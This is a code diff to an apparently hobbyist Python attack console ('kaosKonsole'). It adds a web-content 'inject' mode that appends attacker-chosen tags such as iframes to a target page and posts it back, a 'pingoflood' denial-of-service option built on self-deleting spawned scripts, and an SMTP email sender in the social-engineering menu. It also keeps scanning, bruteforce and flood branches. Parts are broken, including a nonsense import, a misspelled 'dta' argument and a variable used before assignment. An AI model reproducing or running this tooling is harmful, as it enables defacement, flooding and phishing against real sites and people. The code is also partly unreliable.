@@ -6,21 +6,29 @@ import platform
 import random
 import string
 from bs4 import BeautifulSoup
-import shutil
+import gllaglalglalgalglalglalga
 import subprocess
 import urllib.request
+import smtplib
+import time
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
 
+jan = platform.node()
 jani09 = platform.system()
+urrr = platform.architecture()
+rur43 = platform.machine()
+jp06 = platform.version()
 
 defaultpath = os.path.abspath(__file__)
 
 while True:  
     if jani09 == "Windows":
         os.system("title kaosKonsoleBerryBlast")
-        os.system("color 04")
+        os.system("color 0A")
     elif jani09 == "Linux":
         os.system("title kaosKonsoleLimeo")
-        os.system("color 04")
+        print("linux will be better supported soon")
     print("___________________________________________________________________")
     print("                            _    _                                 ")
     print("    /                       /  ,'                           /      ")
@@ -28,24 +36,34 @@ while True:
     print("  /(     /   ) /   ) (_ ` /  \     /   ) /   ) (_ ` /   ) /   /___)")
     print("_/___\__(___(_(___/_(__)_/____\___(___/_/___/_(__)_(___/_/___(___ _")
 
+    print("Jan " + str(jan))
     print("OS: " + jani09)
+    print("Machine: " + rur43)
+    print("Vers. " + jp06)
+    print(urrr)
 
     print("Exploit: e")
     print("Sniff connections within a range: sniff")
     print("Sniff IP + Port status: pingsniff")
     print("Flood IP + Port with connections: flood")
     print("Flood IP + Port with pings: pingflood")
+    print("Pingoflood: pingoflood")
     print("Use pingo: pingo")
     print("Social engineering: soc")
                                                                    
     x1 = input("command: ")
     if x1 == "e":
+        if jani09 == "Windows":
+            os.system("color 0C")
+        elif jani09 == "Linux":
+            print("linux will be better supported soon")
         print("wowza")
         print("available:")
+        print("inject")
         print("nmap")
         print("bruteforce")
         uri9 = input("command: ")
-        p65 = input("Select an IP: ")
+        p65 = input("Select an IP/Hostname: ")
         f34 = int(input("Select da port: "))
         if uri9 == "nmap":
             try:
@@ -54,9 +72,8 @@ while True:
                 print("Arguments: " + mike4)
                 suli0 = nmap.PortScanner()
                 suli0.scan(p65, arguments="-O")
-                ja1 = suli0[p65]['osmatch'][0]
+                ja1 = suli0.scan(p65, arguments=mike4)
                 print("^^ " + ja1['name'], ja1['accuracy'])
-                suli0.scan(p65, arguments=mike4)
             except:
                 print("@w@ " + p65)
             print("continue")
@@ -181,9 +198,11 @@ while True:
                             shutil.copy2(filename, p65)
                             subprocess.run(['python3', '{}/{}'.format(p65, os.path.basename(filename))])
                             print(str(p65) + ":" + str(i) + ":" + str(f34) + " ^^")
+                            os.remove(filename)
                             
                         except:
                             print(str(p65) + ":" + str(i) + ":" + str(f34) + " @w@")
+                            os.remove(filename)
                             pass
                     
                 elif r43 == "getmeout":
@@ -193,6 +212,105 @@ while True:
                     exit
             except:
                 print(str(p65) + " :/")
+
+        elif uri9 == "inject":
+                print("neat")
+                print(" ") 
+                print(" ")
+                print(" ")
+                print("requests")
+                ml23 = input("method: ")
+                if ml23 == "requests":
+                    rita90 = p65
+                    rita77 = print("website: " + rita90)
+                    ron60 = input("element to inject to: ")
+                    lenny44 = input("new tag: ")
+                    morgi11 = input("content to inject: ")
+                    test_cases = [
+                        {
+                            'website': rita90,
+                            'element': ron60,
+                            'tag': lenny44,
+                            'content': 'This is a new paragraph.',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'p',
+                            'tag': 'p',
+                            'content': 'This is a new paragraph.',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'title',
+                            'tag': 'title',
+                            'content': 'waga baga',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'body',
+                            'tag': 'title',
+                            'content': 'waga baga',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'body',
+                            'tag': 'div',
+                            'content': 'waga baga',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'body',
+                            'tag': 'iframe',
+                            'content': 'waga baga',
+                        },
+                        {
+                            'website': rita90,
+                            'element': ron60,
+                            'tag': 'title',
+                            'content': 'New Title',
+                        },
+                        {
+                            'website': rita90,
+                            'element': 'img',
+                            'tag': 'img',
+                            'content': '',
+                        },
+                    ]
+                    for test_case in test_cases:
+                        try:
+                            gh4 = test_case['website']
+                            b234 = test_case['element']
+                            m65 = test_case['tag']
+                            v32 = test_case['content']
+                            print("testing: " + gh4)
+                            skivi = requests.get(gh4)
+                            print(gh4 + " tested!")
+                            rini = BeautifulSoup(skivi.content, 'html.parser')
+                            print("testing: " + b234)
+                            ravi13 = rini.find(b234)
+                            print(b234 + " tested!")
+                            print("testing: " + m65)
+                            x07 = rini.new_tag(m65)
+                            print(m65 + " tested!")
+                            print("testing: " + v32)
+                            x07.string = v32
+                            print(v32 + " tested!")
+                            print("finishing test..")
+                            ravi13.append(x07)
+                            print("test complete!")
+                            print("injecting..")
+                            jonah40 = requests.post(rita90, dta=str(sovi))
+                            rova = requests.get(rita90)
+                            sovi = BeautifulSoup(rova.content, 'html.parser')
+                            blik34 = sovi.find(ron60)
+                            x23 = sovi.new_tag(lenny44)
+                            x23.string = morgi11
+                            blik34.append(x23)
+                            jonah40 = requests.post(rita90, dta=str(sovi))
+                            print("injected!")
+                        except:
+                            print("wango")
+                            break
 
     elif x1 == "flood":
         stop = False
@@ -242,6 +360,7 @@ while True:
                             os.system("python " + jar44)
                         except:
                             print(str(j44) + str(port) + " +0")
+
             else:
                 if j44 == "99":
                     stop = True
@@ -260,6 +379,65 @@ while True:
                     except:
                         print(str(j44) + " +0")
                         continue
+
+    elif x1 == "pingoflood":
+        ports = []
+        stop = False
+        while not stop:
+            print("boingboinnggggboing")
+            j342 = input("HOSTNAME: ")
+            m13 = input("REQUESTS: ")
+            l56 = input("CONNECTIONS: ")
+            m32 = input("HOSPORT: ")
+            print("Options:")
+            print("-r to specify range")
+            nuji324 = input("Number of requests: ")
+            if "-r" in j342:
+                m77 = int(input("Select da port range: "))
+                julie26 = list(map(int, m77.split()))
+                ports.extend(julie26)
+                if j342 == "99":
+                    stop = True
+                    break
+                for port in ports:
+                    print(port )
+                    while True:
+                        try:
+                            jar44 = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
+                            with open (jar44, "w") as f:
+                                w = f.write
+                                w("import os")
+                                w("import subprocess")
+                                w("try:")
+                                w("    output = subprocess.check_output(['ruby', '--version'], stderr=subprocess.STDOUT)")
+                                w(f"    subprocess.Popen(['ruby', 'pingo.rb', '-n' , {m13}, '-c', {l56}, '-h', {j342}, '-p', {m32}], stdout=subprocess.PIPE, stderr=subprocess.PIPE)")
+                                w("os.remove(__file__)")
+                            print("+" + jar44)
+                            os.system("python " + jar44)
+                            print(str(j342) + " +1")
+                        except:
+                            print(str(j342) + str(port) + " +0")
+
+            else:
+                if j342 == "99":
+                    stop = True
+                    break
+
+                while True:
+                    try:
+                        jar44 = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10)) + ".py"
+                        with open (jar44, "w") as f:
+                            w = f.write
+                            w("try:")
+                            w("    output = subprocess.check_output(['ruby', '--version'], stderr=subprocess.STDOUT)")
+                            w(f"    subprocess.Popen(['ruby', 'pingo.rb', '-n' , {m13}, '-c', {l56}, '-h', {j342}, '-p', {m32}], stdout=subprocess.PIPE, stderr=subprocess.PIPE)")
+                            w("os.remove(__file__)")
+                        os.system("python " + jar44)
+                        print("+" + jar44)
+                        print(str(j342) + " +1")
+                    except:
+                        print(str(j342) + " +0")
+                        continue 
 
     elif x1 == "sniff":
         print("yowza")
@@ -318,10 +496,10 @@ while True:
             print(v3)
         except subprocess.CalledProcessError:
             print("u dont got that")
-            break
+            continue
         except FileNotFoundError:
             print("u dont got that")
-            break
+            continue
 
     elif x1 == "soc":
         if jani09 == "Windows":
@@ -330,7 +508,7 @@ while True:
             os.system("title evileye")
         elif jani09 == "Linux":
             os.system("cls")
-            os.system("color 03")
+            print("linux will be better supported soon")
             os.system("title evileye")
         print("                             ▒▒▒▒▓▓▒▒▒▒▓▓▒▒░░                         ")
         print("                      ▓▓▒▒▒▒▒▒░░▓▓░░▒▒▒▒░░▓▓▓▓▒▒▓▓                    ")
@@ -532,6 +710,47 @@ while True:
                         except:
                             print("wango")
                             break
+        elif jj34 == "email":
+            try:
+                loji35 = input("Email from: ")
+                nn32 = input("Email to: ")
+                kl1 = input("Email subject: ")
+                u64 = input("Email body: ")
+                uo7 = input("SMTP Server: ")
+                rr3 = int(input("SMTP Port: "))
+                r343 = input("SMTP Username: ")
+                uyy8 = input("SMTP Password: ")
+
+                iu75 = loji35
+                sm35 = nn32
+                kjr99 = kl1
+                jj9 = u64
+
+                msg = MIMEMultipart()
+                msg['From'] = iu75
+                msg['To'] = sm35
+                msg['Subject'] = kjr99
+                msg.attach(MIMEText(jj9, 'plain'))
+
+                rox9 = uo7
+                smmms1 = rr3
+                tpU84 = r343
+                pppp = uyy8
+                server = smtplib.SMTP(rox9, smmms1)
+                server.starttls()
+                server.login(tpU84, pppp)
+
+                server.sendmail(loji35, nn32, msg.as_string())
+                server.quit()
+                print("Sent!")
+                continue
+            except:
+                print("@w@")
+                continue
+
+    elif x1 == jani09:
+
+        time.sleep(4)
                 
     elif x1 == "3":
         print("bowza")
